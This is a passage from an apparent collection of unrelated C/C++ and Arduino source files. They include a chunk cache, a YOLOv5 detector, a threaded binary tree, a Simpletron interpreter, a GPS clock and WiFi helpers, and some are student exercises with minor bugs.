EXIT_SUCCESS;\n}\n",
    "#include \"async_chunk_cache.h\"\n#include \"chunk.h\"\n#include \"config.h\"\n#include \"terrain_generator.h\"\n#include \"thread_pool.h\"\n\nAsyncChunkCache::AsyncChunkCache() {\n    this->generator_ = new PerlinTerrainGeneratror(200);\n    this->pool_ = new ThreadPool(2);\n}\n\nChunk* AsyncChunkCache::getChunk(const ChunkPos& pos) {\n    auto hash = pos.hash();\n\n    Chunk* chunk{nullptr};\n    if (this->chunk_cache_.get(hash, chunk)) {\n        lru_.promote(hash);\n        return chunk;\n    }\n\n    // post new taks\n    if (!this->task_queue_.contains(hash)) {\n        this->pool_->enqueue([this, pos, hash]() {\n            auto* chunk = new Chunk(pos, this->generator_);\n            this->chunk_cache_.add(hash, chunk);\n            lru_.insert(hash);\n            this->task_queue_.remove(hash);\n        });\n    }\n\n    // \u56e0\u4e3a\u6790\u6784\u8981\u91ca\u653emesh\uff0c\u6240\u4ee5\u9700\u8981\u5728\u8fd9\u91cc\u6790\u6784w\n    while (this->chunk_cache_.size() > Config::chunk_cache_size) {\n        auto old = this->lru_.oldest();\n        lru_.evict(old);\n        Chunk* to_deleted{nullptr};\n        if (this->chunk_cache_.get(old, to_deleted)) {\n            this->chunk_cache_.erase(old);\n            delete chunk;\n        }\n    }\n\n    return nullptr;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"progectmanaging\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// #include <iostream>\n// using namespace std; \n\n// // pass by value and pass by refernce \n// // pass by value - when you define a variable in the main function and send it to a function at the top of the program, this is called a pass by value. The values and variables are COPIED, so they appear in the memory twice. If you update the value in the function, it will not change the values within main. This is what we have been doing in class. to use: \" int& a\" within the parameters\n\n\n// // pass by refernce - sending location of variables to function. updating values in function WILL change values in main function. These are not copies of the data sets like in pass by reference. They are located and used by its address. th symbol for address is \"&\" \n\n\n// void test_func(int& x){\n//   cout << \"in test fun 1 \" << x << endl;\n//   x= 10;\n//   cout << \"inside test func\" << x << endl;\n\n// }\n// // we are not using the same variable in the function above but the code works. this \"x\" is just a pointer. the address is based ont he value we pass in, in the main function \n\n// int main() {\n//  int a= 5; \n//   cout << \"The value of x is \" <<a<< \"And its address is \" <<&a <<endl;\n//   test_func(a);\n//   cout << \"this is after update \" << a;\n\n\n// }",
    "#include \"mysimpletron.hpp\"\n\n#include <iomanip>\n\nSimpletron::Simpletron(int size) : memory(size, 0) {} //inti memory..\n\nvoid Simpletron::load_program(const std::vector<int>& program) {\n    for (size_t i = 0; i < program.size() && i < memory.size(); ++i) {\n        memory[i] = program[i];\n    }\n}\nvoid Simpletron::execute() {\n    bool running = true;\n    while (running && instructionCounter < memory.size()) {\n        instructionRegister = memory[instructionCounter];\n        operationCode = instructionRegister / 100;  // Parse the opcode\n        operand = instructionRegister % 100;        // Parse the operand\n\n        switch (operationCode) {\n        case 10:  // Read and store at operand\n            // Skipped reading from user, assume data is preset\n            break;\n        case 20:  // Write from operand\n            std::cout << \"> \" << memory[operand] << std::endl;\n            break;\n        case 30:  // Load from operand\n            accumulator = memory[operand];\n            break;\n        case 31:  // Add immediate value\n            accumulator += operand;\n            break;\n        case 21:  // Store into operand\n            memory[operand] = accumulator;\n            break;\n        case 40:  // Halt\n            running = false;\n            break;\n        default:\n            std::cerr << \"Error: Invalid operation code \" << operationCode << std::endl;\n            running = false;\n            break;\n        }\n        instructionCounter++;\n    }\n}\n\nvoid Simpletron::dump() const {\n    std::cout << \"\\nRegisters:\\n\";\n    std::cout << \"accumulator:           \" << std::setw(5) << accumulator << std::endl;\n    std::cout << \"instructionCounter:    \" << std::setw(5) << instructionCounter << std::endl;\n    std::cout << \"instructionRegister:   \" << std::setw(5) << instructionRegister << std::endl;\n    std::cout << \"operationCode:         \" << std::setw(5) << operationCode << std::endl;\n    std::cout << \"operand:               \" << std::setw(5) << operand << std::endl;\n    std::cout << \"\\nMemory:\\n\";\n    for (int i = 0; i < memory.size(); ++i) {\n        if (i % 10 == 0) {\n            std::cout << std::endl;\n        }\n        std::cout << std::setw(5) << memory[i];\n    }\n    std::cout << std::endl;\n}\n",
    "#include <utils.h>\n\ncv::dnn::Net Yolov5Detector::loadNet(const string modelPath, bool is_cuda = false)\n{\n    cv::dnn::dnn4_v20211004::Net model = cv::dnn::readNet(modelPath);\n    if (is_cuda)\n    {\n        cout << \"Attempty to use CUDA\\n\";\n        model.setPreferableBackend(cv::dnn::DNN_BACKEND_CUDA);\n        model.setPreferableTarget(cv::dnn::DNN_TARGET_CUDA_FP16);\n    }\n    else\n    {\n        cout << \"Running on CPU\\n\";\n        model.setPreferableBackend(cv::dnn::DNN_BACKEND_OPENCV);\n        model.setPreferableTarget(cv::dnn::DNN_TARGET_CPU);\n    }\n    return model;\n}\n\nvector<string> Yolov5Detector::loadClassesList(const string filePath)\n{\n    vector<string> class_list;\n    ifstream ifs(filePath);\n    string line;\n    while (getline(ifs, line))\n    {\n        class_list.push_back(line);\n    }\n    return class_list;\n}\n\ncv::Mat Yolov5Detector::format2Yolov5(const cv::Mat source)\n{\n    int col = source.cols;\n    int row = source.rows;\n    int _max = MAX(col, row);\n    cv::Mat result = cv::Mat::zeros(_max, _max, CV_8UC3);\n    source.copyTo(result(cv::Rect(0, 0, col, row)));\n    return result;\n}\n\nYolov5Detector::Yolov5Detector(const string modelPath, const string classesFilePath, const bool useGPU)\n{\n    this->net = this->loadNet(modelPath, useGPU);\n    this->classNames = this->loadClassesList(classesFilePath);\n}\n\nYolov5Detector::DetectionData Yolov5Detector::detect(cv::Mat image, const bool draw)\n{\n    cv::Mat blob;\n\n    cv::Mat input_image = this->format2Yolov5(image);\n\n    cv::dnn::blobFromImage(input_image, blob, 1. / 255., cv::Size(INPUT_WIDTH, INPUT_HEIGHT), cv::Scalar(), true,\n                           false);\n\n    this->net.setInput(blob);\n    vector<cv::Mat> outputs;\n    this->net.forward(outputs, this->net.getUnconnectedOutLayersNames());\n\n    float x_factor = input_image.cols / INPUT_WIDTH;\n    float y_factor = input_image.rows / INPUT_HEIGHT;\n\n    float *data = (float *)outputs[0].data;\n\n    const int dimensions = 85;\n    const int rows = 25200;\n\n    vector<int> class_ids;\n    vector<float> confidences;\n    vector<cv::Rect> boxes;\n\n    for (int i = 0; i < rows; ++i)\n    {\n        float confidence = data[4];\n        if (confidence >= CONFIDENCE_THRESHOLD)\n        {\n            float *classes_scores = data + 5;\n            cv::Mat scores(1, this->classNames.size(), CV_32FC1, classes_scores);\n            cv::Point class_id;\n            double max_class_score;\n            minMaxLoc(scores, 0, &max_class_score, 0, &class_id);\n            if (max_class_score > SCORE_THRESHOLD)\n            {\n                confidences.push_back(confidence);\n                class_ids.push_back(class_id.x);\n\n                float x = data[0];\n                float y = data[1];\n                float w = data[2];\n                float h = data[3];\n                // Width, height and x,y coordinates of bounding box\n\n                int x1 = int((x - 0.5 * w) * x_factor);\n                int y1 = int((y - 0.5 * h) * y_factor);\n                int x2 = int(w * x_factor);\n                int y2 = int(h * y_factor);\n                boxes.push_back(cv::Rect(x1, y1, x2, y2));\n            }\n        }\n        data += 85;\n    }\n\n    vector<Detection> output;\n    vector<int> nms_result;\n    cv::dnn::NMSBoxes(boxes, confidences, SCORE_THRESHOLD, NMS_THRESHOLD, nms_result);\n    for (int i = 0; i < nms_result.size(); i++)\n    {\n        int idx = nms_result[i];\n        Detection result;\n        result.class_id = class_ids[idx];\n        result.confidence = confidences[idx];\n        result.box = boxes[idx];\n        output.push_back(result);\n    }\n\n    DetectionData ret;\n    ret.detections = output;\n    if (draw)\n    {\n        image = this->draw(image, output);\n    }\n    ret.image = image;\n\n    return ret;\n}\n\ncv::Mat Yolov5Detector::draw(cv::Mat image, const vector<Detection> detections)\n{\n    for (const Detection &detection : detections)\n    {\n        cv::Rect box = detection.box;\n        int classId = detection.class_id;\n        const auto &color = this->colors[classId % this->colors.size()];\n        cv::rectangle(image, box, color, 3);\n        cv::rectangle(image, cv::Point(box.x, box.y - 20), cv::Point(box.x + box.width, box.y), color, cv::FILLED);\n        cv::putText(image, this->classNames[classId], cv::Point(box.x, box.y - 5), cv::FONT_HERSHEY_SIMPLEX, 0.5,\n                    cv::Scalar(0, 0, 0));\n    }\n\n    return image;\n}\n",
    "// Copyright(c) 2024 grrimgrriefer & DZnnah, see LICENSE for details.\n\n#include \"pch.h\"\n#include \"CppUnitTest.h\"\n#include \"../TalkToMeCPP/src/Voxta/DataTypes/ServiceData.h\"\n#include <string>\n\nusing namespace Microsoft::VisualStudio::CppUnitTestFramework;\n\nnamespace TalkToMeCPPTests\n{\n\tTEST_CLASS(ServiceDataTests)\n\t{\n\tpublic:\n\t\tTEST_METHOD(TestServiceDataConstructorServiceType)\n\t\t{\n\t\t\tVoxta::DataTypes::ServiceData::ServiceType serviceType = Voxta::DataTypes::ServiceData::ServiceType::TEXT_GEN;\n\t\t\tVoxta::DataTypes::ServiceData serviceData(serviceType, \"TextGenerator\", \"service001\");\n\n\t\t\tAssert::IsTrue(serviceType == serviceData.m_serviceType);\n\t\t}\n\n\t\tTEST_METHOD(TestServiceDataConstructorServiceName)\n\t\t{\n\t\t\tstd::string serviceName = \"TextGenerator\";\n\t\t\tVoxta::DataTypes::ServiceData serviceData(Voxta::DataTypes::ServiceData::ServiceType::TEXT_GEN, serviceName, \"service001\");\n\n\t\t\tAssert::AreEqual(serviceName, serviceData.m_serviceName);\n\t\t}\n\n\t\tTEST_METHOD(TestServiceDataConstructorServiceId)\n\t\t{\n\t\t\tstd::string serviceId = \"service001\";\n\t\t\tVoxta::DataTypes::ServiceData serviceData(Voxta::DataTypes::ServiceData::ServiceType::TEXT_GEN, \"TextGenerator\", serviceId);\n\n\t\t\tAssert::AreEqual(serviceId, serviceData.m_serviceId);\n\t\t}\n\t};\n}",
    "//210201096\n// Alperen KARACAN\n#include <stdio.h>\n#include <graphics.h>\n#include <stdbool.h>\n#define MAX_SEKIL 10\n#define MAX_NOKTA 100\n\ntypedef struct {\n    int x[MAX_NOKTA];\n    int y[MAX_NOKTA];\n    int nokta_sayisi;\n} Sekil;\n\nSekil sekiller[MAX_SEKIL];\nint sekil_sayisi = 0;\n\nbool icinde_mi(int x[], int y[], int n, double noktaX, double noktaY) {\n    int i, j;\n    bool son = false;\n    for (i = 0, j = n-1; i < n; j = i++) {\n        if ((y[i] > noktaY) != (y[j] > noktaY) &&\n            (noktaX < (x[j] - x[i]) * (noktaY - y[i]) / (y[j] - y[i]) + x[i])) {\n            son = !son;\n        }\n    }\n    return son;\n}\n\nvoid cizVeHesapla(Sekil sekil, int olcekFaktoru, double birimSondajMaliyeti, double birimPlatformMaliyeti) {\n    \n    int platformSayisi = 0;\n    double toplamPlatformMaliyeti = 0.0;\n\n    int olceklendirilmisNoktalar[2 * MAX_NOKTA];\n    for (int i = 0; i < sekil.nokta_sayisi; ++i) {\n        olceklendirilmisNoktalar[2 * i] = sekil.x[i] * olcekFaktoru;\n        olceklendirilmisNoktalar[2 * i + 1] = sekil.y[i] * olcekFaktoru;\n    }\n\n     int sayac = 0;\n\n    drawpoly(sekil.nokta_sayisi, olceklendirilmisNoktalar);\n\n    for (int i = 0; i < getmaxx(); i += olcekFaktoru) {\n        for (int j = 0; j < getmaxy(); j += olcekFaktoru) {\n            bool merkezIcindemi = icinde_mi(sekil.x, sekil.y, sekil.nokta_sayisi, (i + olcekFaktoru / 2.0) / olcekFaktoru, (j + olcekFaktoru / 2.0) / olcekFaktoru);\n            if (merkezIcindemi) {\n                sayac++;\n                rectangle(i, j, i + olcekFaktoru, j + olcekFaktoru);\n                platformSayisi++;\n            }\n        }\n    }\n    double toplamSondajMaliyeti = sayac * birimSondajMaliyeti;\n    char sayac_str[50];\n    sprintf(sayac_str, \"%d\", sayac);\n    int agirlikMerkeziX = 0, agirlikMerkeziY = 0;\n    for (int i = 0; i < sekil.nokta_sayisi; i++) {\n        agirlikMerkeziX += sekil.x[i];\n        agirlikMerkeziY += sekil.y[i];\n    }\n    agirlikMerkeziX /= sekil.nokta_sayisi;\n    agirlikMerkeziY /= sekil.nokta_sayisi;\n    outtextxy(agirlikMerkeziX * olcekFaktoru - 10, agirlikMerkeziY * olcekFaktoru, sayac_str);\n    // sayac, birim kare say\u0131s\u0131n\u0131 tutuyor. Bu da y\u00fczey alan\u0131n\u0131 verir.\n    double rezervDegeri = sayac * 10;  // Alan\u0131 10'la \u00e7arpt\u0131m\n   \n    toplamPlatformMaliyeti = platformSayisi * birimPlatformMaliyeti;\n    double toplamMaliyet = toplamSondajMaliyeti + toplamPlatformMaliyeti;\n\n    \n    double karMiktari = rezervDegeri - toplamMaliyet;\n    char rezervDegeri_str[20];\n    sprintf(rezervDegeri_str, \"Rezerv Degeri: %.0lf\", rezervDegeri);\n    outtextxy(10, getmaxy() - 60, rezervDegeri_str);  // Ekran\u0131n alt\u0131na rezerv de\u011ferini yaz\u0131yor\n    // Maliyet ve kar bilgilerini ekranda g\u00f6sterme\n    char info[150];\n    sprintf(info, \"Toplam Platform: %.2lf, Toplam Sondaj: %.2lf\",\n            toplamPlatformMaliyeti,toplamSondajMaliyeti );\n            outtextxy(10, getmaxy() - 40, info);\n    settextstyle(DEFAULT_FONT, HORIZ_DIR, 1);\n     sprintf(info, \"Toplam Maliyet: %.2f, Kar: %.2f\",\n             toplamMaliyet, karMiktari);\n             outtextxy(10, getmaxy() - 20, info);\n    \n    \n}\n\n\n\n\nvoid dosyadanSekilleriOku() {\n    FILE *dosya = fopen(\"prolab1.txt\", \"r\");\n    char satir[300];\n    while (fgets(satir, sizeof(satir), dosya)) {\n        Sekil sekil;\n        int x, y;\n        sscanf(satir, \"%*[^(](%d,%d)\", &x, &y);\n\n        sekil.x[0] = x;\n        sekil.y[0] = y;\n        sekil.nokta_sayisi = 1;\n\n        char *ptr = satir;\n        while ((ptr = strstr(ptr + 1, \"(\"))) {\n            sscanf(ptr, \"(%d,%d)\", &x, &y);\n            sekil.x[sekil.nokta_sayisi] = x;\n            sekil.y[sekil.nokta_sayisi] = y;\n            sekil.nokta_sayisi++;\n        }\n\n        sekiller[sekil_sayisi++] = sekil;\n    }\n    fclose(dosya);\n}\n\nint main() {\n    int gd = DETECT, gm;\n    initgraph(&gd, &gm, NULL);\n     \n    double birimSondajMaliyeti, birimPlatformMaliyeti;\n    do {\n        printf(\"Birim sondaj maliyetini giriniz : \");\n        scanf(\"%lf\", &birimSondajMaliyeti);\n        if (birimSondajMaliyeti < 1 || birimSondajMaliyeti > 10) {\n            printf(\"Deger 1 ile 10 arasinda olmalidir.\\n\");\n        }\n    } while (birimSondajMaliyeti < 1 || birimSondajMaliyeti > 10);\n\n    do {\n        printf(\"Birim platform maliyetini giriniz: \");\n        scanf(\"%lf\", &birimPlatformMaliyeti);\n        if (birimPlatformMaliyeti < 1 || birimPlatformMaliyeti > 10) {\n            printf(\"Deger 1 ile 10 arasinda olmalidir.\\n\");\n        }\n    } while (birimPlatformMaliyeti < 1 || birimPlatformMaliyeti > 10);\n     \n     \n     \n    dosyadanSekilleriOku();\n\n    int secim = 0;\n    int olcekFaktoru = 10;\n\n    while (secim != -1) {\n        cleardevice();\n        printf(\"Lutfen cizmek istediginiz sekli secin:\\n\");\n        for (int i = 0; i < sekil_sayisi; i++) {\n            printf(\"%d: Sekil %d\\n\", i + 1, i + 1);\n        }\n        printf(\"-1'e basarak cikabilirsiniz.\\n\");\n        scanf(\"%d\", &secim);\n\n        if (secim > 0 && secim <= sekil_sayisi) {\n            cizVeHesapla(sekiller[secim - 1], olcekFaktoru ,birimSond",
    "/*\r\n\t\r\n\tProblem Statment -\r\n\t\tConsider threading a binary tree using preorder threads rather than inorder threads.\r\n\t\tDesign an algorithm for traversal without using stack and analyse its complexity.\r\n*/\r\n\r\n#include<iostream>\r\nusing namespace std;\r\n\r\nclass Node\r\n{\r\n\tNode* left;\r\n\tNode* right;\r\n\tbool rthread;\r\n\tbool lthread;\r\n\tint data;\r\n\r\n\tNode(int d)\r\n\t{\r\n\t\tdata = d;\r\n\t\trthread = lthread = false;\r\n\t\tleft = right = NULL;\r\n\t}\r\n\tfriend class TBST;\r\n};\r\n\r\nclass TBST\r\n{\r\n\t\tNode* root = NULL;\r\n\tpublic:\r\n\t\tvoid insert(Node* root,int d)\r\n\t\t{\r\n\t\t\tNode* p =  new Node(d);\r\n\t\t\tif(this -> root == NULL)\r\n\t\t\t{\r\n\t\t\t\tthis -> root = p;\r\n\t\t\t\treturn;\r\n\t\t\t}\r\n\t\t\tif(root -> data > d)\r\n\t\t\t{\r\n\t\t\t\tif(root -> left && root -> lthread == false)\r\n\t\t\t\t\tinsert(root -> left,d);\r\n\t\t\t\telse\r\n\t\t\t\t{\r\n\t\t\t\t\tp -> left = root -> left;\r\n\t\t\t\t\tp -> lthread = root -> lthread;\r\n\r\n\t\t\t\t\troot -> left = p;\r\n\t\t\t\t\troot -> lthread = false;\r\n\r\n\t\t\t\t\tp -> right = root;\r\n\t\t\t\t\tp -> rthread = true;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\tif(root -> right && root -> rthread == false)\r\n\t\t\t\t\tinsert(root -> right,d);\r\n\t\t\t\telse\r\n\t\t\t\t{\r\n\t\t\t\t\tp -> right = root -> right;\r\n\t\t\t\t\tp -> rthread = root -> rthread;\r\n\r\n\t\t\t\t\troot -> right = p;\r\n\t\t\t\t\troot -> rthread = false;\r\n\r\n\t\t\t\t\tp -> left = root;\r\n\t\t\t\t\tp -> lthread = true;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\t\tNode* leftMost(Node* current)\r\n\t\t{\r\n\t\t\tif(current == NULL)\r\n\t\t\t\treturn NULL;\r\n\t\t\twhile(current -> left && current -> lthread == false)\r\n\t\t\t\tcurrent = current -> left;\r\n\t\t\treturn current;\r\n\t\t};\r\n\r\n\t\tNode* rightMost(Node* current)\r\n\t\t{\r\n\t\t\tif(current == NULL)\r\n\t\t\t\treturn NULL;\r\n\t\t\twhile(current -> right && current -> rthread == false)\r\n\t\t\t\tcurrent = current -> right;\r\n\t\t\treturn current;\r\n\t\t};\r\n\r\n\t\tNode* InSucc(Node* current)\r\n\t\t{\r\n\t\t\tif(current -> rthread)\r\n\t\t\t\treturn current -> right;\r\n\t\t\treturn leftMost(current -> right);\r\n\t\t}\r\n\r\n\t\tNode* InPred(Node* current)\r\n\t\t{\r\n\t\t\tif(current -> lthread)\r\n\t\t\t\treturn current -> left;\r\n\t\t\treturn rightMost(current -> left);\r\n\t\t}\r\n\r\n\t\tNode* getRoot()\r\n\t\t{\r\n\t\t\treturn root;\r\n\t\t}\r\n\r\n\t\tvoid InOrder()\r\n\t\t{\r\n\t\t\tNode* current = leftMost(root);\r\n\t\t\twhile(current)\r\n\t\t\t{\r\n\t\t\t\tcout<<current -> data<<\" \";\r\n\t\t\t\tcurrent = InSucc(current);\r\n\t\t\t}\r\n\t\t}\r\n\t\tvoid PreOrder()\r\n\t\t{\r\n\t\t\tNode* current = root;\r\n\t\t\tNode* temp;\r\n\t\t\twhile(1)\r\n\t\t\t{\r\n\t\t\t\twhile(current)\r\n\t\t\t\t{\r\n\t\t\t\t\tcout<<current -> data<<\" \";\r\n\t\t\t\t\ttemp = current;\r\n\t\t\t\t\tif(current -> lthread == false)\r\n\t\t\t\t\t\tcurrent = current -> left;\r\n\t\t\t\t\telse\r\n\t\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t\tcurrent = temp;\r\n\r\n\t\t\t\twhile(current -> rthread)\r\n\t\t\t\t\tcurrent = current -> right;\r\n\t\t\t\tcurrent = current -> right;\r\n\r\n\t\t\t\tif(current == NULL)\r\n\t\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t}\r\n};\r\n\r\nint main()\r\n{\r\n\tTBST t;\r\n\tint ch;\r\n\tint d;\r\n\tdo\r\n\t{\r\n\t\tcout<<\"\\n-----MENU-----\"<<endl;\r\n\t\tcout<<\"1.Insert a Node.\"<<endl;\r\n\t\tcout<<\"2.Inorder Traversal.\"<<endl;\r\n\t\tcout<<\"3.PreOrder Traversal.\"<<endl;\r\n\t\tcout<<\"4.Exit.\"<<endl;\r\n\t\tcout<<\"Enter Your Choice : \";\r\n\t\tcin>>ch;\r\n\t\tswitch(ch)\r\n\t\t{\r\n\t\t\tcase 1:\r\n\t\t\t\tcout<<\"Enter Node to be inserted : \";\r\n\t\t\t\tcin>>d;\r\n\t\t\t\tt.insert(t.getRoot(),d);\r\n\t\t\t\tbreak;\r\n\t\t\tcase 2:\r\n\t\t\t\tcout<<\"\\nInorder : \";\r\n\t\t\t\tt.InOrder();\r\n\t\t\t\tcout<<endl;\r\n\t\t\t\tbreak;\r\n\t\t\tcase 3:\r\n\t\t\t\tcout<<\"\\nPreOrder : \";\r\n\t\t\t\tt.PreOrder();\r\n\t\t\t\tcout<<endl;\r\n\t\t\t\tbreak;\r\n\r\n\t\t}\r\n\t}while(ch != 4);\r\n\r\n\t\r\n\treturn 0;\r\n}\r\n",
    "// Including the required Arduino libraries\n#include <MD_Parola.h>\n#include <MD_MAX72xx.h>\n#include <SPI.h>\n#include <TinyGPS++.h>       // include TinyGPS++ library\n#include <TimeLib.h>         // include Arduino time library\n#include <SoftwareSerial.h>  // include software serial library\n\n// Uncomment according to your hardware type\n#define HARDWARE_TYPE MD_MAX72XX::FC16_HW\n//#define HARDWARE_TYPE MD_MAX72XX::GENERIC_HW\n\n// Defining size, and output pins\n#define MAX_DEVICES 8\n#define CS_PIN 9\n\nTinyGPSPlus gps;\n\n#define S_RX 3  // define software serial RX pin (No TX used)\n\nSoftwareSerial SoftSerial(S_RX, -1);  // configure SoftSerial library\n\n// Create a new instance of the MD_Parola class with hardware SPI connection\nMD_Parola myDisplay = MD_Parola(HARDWARE_TYPE, CS_PIN, MAX_DEVICES);\n\n#define time_offset -14400  // define a clock offset in seconds Note: (1 hour) ==> UTC + 1 (but in seconds)\n\n// variable definitions\nchar Time[] = \"TIME: 00:00:00\";\nchar Date[] = \"DATE: 00-00-2000\";\nbyte last_second, Second, Minute, Hour, Day, Month;\nint Year;\n\n// variable defaults\nbool timeIsSet = false;\n\nint h, m, s;\n\nint mill = 0;\n\nint timeout = 0;\nint lastMillis = 0;\nint lastCheck = 0;\n\nunsigned long currentMillis = 0;\n\nvolatile bool pulse = false;\n\n\nvoid setup() {\n  //Strictly utilized for debugging purposes.\n  Serial.begin(115200);\n\n  // Set the intensity (brightness) of the display (0-15)\n  myDisplay.begin();\n  myDisplay.setIntensity(0);\n  myDisplay.displayClear();\n  myDisplay.setTextAlignment(PA_LEFT);\n\n  cli();  // Disable interrupts\n    // Set Timer2 to interrupt every 1 ms\n  TCCR2A = 0;  // Set entire TCCR2A register to 0\n  TCCR2B = 0;  // Same for TCCR2B\n  TCNT2 = 0;   // Initialize counter value to 0\n  // Set compare match register to desired timer count.\n  OCR2A = 249;  // 16MHz / 64 (prescaler) / 250 = 1000 Hz\n  // Enable CTC mode\n  TCCR2A |= (1 << WGM21);\n  // Set prescaler to 64 and start the timer\n  TCCR2B |= (1 << CS22);\n  // Enable timer compare interrupt\n  TIMSK2 |= (1 << OCIE2A);\n\n  // Enable global interrupts\n  sei();  // Enable interrupts\n\n  attachInterrupt(digitalPinToInterrupt(2), PPS, RISING);  // Attach interrupt to pin 2, triggering on rising edge\n}\n\n// Triggered every 1ms, using timer2 interrupts for accurate (enough) timing of the milliseconds.\nISR(TIMER2_COMPA_vect) {\n  if (timeIsSet) {\n    mill++;  //increment by 1;\n  }\n}\n\nvoid loop() {\n  if (timeIsSet == false) {  //Determine whether the GPS is needed to set the initial time.\n    timeIsSet = true;\n\n    Serial.print(\"Time is being set...\");\n\n    SoftSerial.begin(9600);  // initialize software serial at 9600 baud\n\n    getTime();\n\n    SoftSerial.end();  // End it so that it does not interfere later...\n\n    Serial.println(\"done!\");\n\n    myDisplay.setTextAlignment(PA_LEFT);\n\n    h = String(hour()).toInt();\n    m = String(minute()).toInt();\n    s = String(second()).toInt();\n\n    mill = 0;\n    timeout = 0;\n  }\n\n  if (pulse) {\n    pulse = false;\n    timeout = 0;\n    mill = 0;\n\n    s++;\n  }\n\n\n  /*if (timeout >= 5000) {\n    timeout = 0;\n    timeIsSet = false;\n    Serial.println(\"Timed out, acquiring new time from GPS...\");\n  }*/\n\n\n  ////////////////// WORK WITH TIME ///////////////////\n\n  if (s > 59) {\n    s = 0;\n    m++;\n    mill = 0;\n  }\n  if (m > 59) {\n    m = 0;\n    h++;\n    mill = 0;\n  }\n  if (h > 23) {\n    h = 0;\n    m = 0;\n    s = 0;\n    mill = 0;\n  }\n\n  printTime(String(h).toInt(), String(m).toInt(), String(s).toInt(), String(mill).toInt());\n}\n\nvoid printTime(int hr, int mn, int sc, int ms) {\n  String hour_str = String(hr);\n  String minute_str = String(mn);\n  String second_str = String(sc);\n  String millisecond_str = String(ms);\n\n  // Format the data to fit on the display better, and increase readability;\n\n  if (hr < 10) {\n    hour_str = \"0\" + hour_str;\n  }\n\n  if (mn < 10) {\n    minute_str = \"0\" + minute_str;\n  }\n\n  if (sc < 10) {\n    second_str = \"0\" + second_str;\n  }\n\n  if (ms < 10) {\n    millisecond_str = \"0\" + millisecond_str;\n  } else if (ms < 100) {\n    millisecond_str = \"00\" + millisecond_str;\n  }\n\n  String data = hour_str + \":\" + minute_str + \":\" + second_str + \":\" + millisecond_str;\n\n  myDisplay.print(data);  // Update the display with the relevant information.\n}\n\nvoid getTime() {\n  bool completed = false;\n\n  myDisplay.displayClear();\n  myDisplay.setTextAlignment(PA_CENTER);\n  myDisplay.print(\"Finding Sats.\");\n\n  while (!completed) {\n    while (SoftSerial.available() > 0) {\n      if (gps.encode(SoftSerial.read())) {\n\n        // get time from GPS module\n        if (gps.time.isValid()) {\n          Minute = gps.time.minute();\n          Second = gps.time.second();\n          Hour = gps.time.hour();\n        }\n\n        // set currentMillis UTC time\n        setTime(Hour, Minute, Second, Day, Month, Year);\n\n        // add the offset to get local time\n        adjustTime(time_offset);\n\n        // update time array\n        Time[12] = second() / 10 + '0';\n        Time[13] = second() % 10 + '0';\n        Time[9] = minute() / 10 + '0';\n        Time",
    "#include \"WifiUtils.h\"\n\n//            INSTRUCTIONS            //\n// Excellent: RSSI greater than -50 dBm\n// Good: RSSI between -50 dBm and -60 dBm\n// Acceptable: RSSI between -60 dBm and -70 dBm\n// Weak: RSSI less than -70 dBm\nvoid showWifiIntense()\n{\n  int rssi = WiFi.RSSI();\n  Serial.print(\"Signal strength WiFi (RSSI): \");\n  Serial.print(rssi);\n  Serial.println(\" dBm\");\n}\n\n//            INSTRUCTIONS              //\n// 82: for a transmitting power of +20 dBm\n// 78: for a transmit power of +17 dBm\n// 74: for a transmitting power of +14 dBm\n// 70: for a transmit power of +11 dBm\n// 68: for a transmit power of +8 dBm\n// 64: for a transmit power of +5 dBm\n// 60: for a transmit power of +2 dBm\n// 58: for a transmitting power of -1 dBm\n// 56: for a transmit power of -2 dBm\nvoid showTxPower()\n{\n  int txPower = WiFi.getTxPower();\n  Serial.print(\"Transmission power WiFi: \");\n  Serial.print(txPower);\n  Serial.println(\" dBm\");\n}\n\n// Get the GatewayAddress of the WiFi connection\nstd::string getGatewayAddress()\n{\n  IPAddress gateway = WiFi.gatewayIP();\n  char str[16];\n  snprintf(str, sizeof(str), \"%d.%d.%d.%d\", gateway[0], gateway[1], gateway[2], gateway[3]);\n  return std::string(str);\n}\n\n// Get the MacAddress\nstd::string getMacAddress()\n{\n  byte mac[6];\n  WiFi.macAddress(mac);\n\n  char macStr[18]; // Enough space for MAC address in format XX:XX:XX:XX:XX:XX and null terminator\n  snprintf(macStr, sizeof(macStr), \"%02X:%02X:%02X:%02X:%02X:%02X\",\n           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);\n  return std::string(macStr);\n}\n\n\n\nbool checkWifiConnection()\n{\n  return WiFi.status() == WL_CONNECTED;\n}\n",
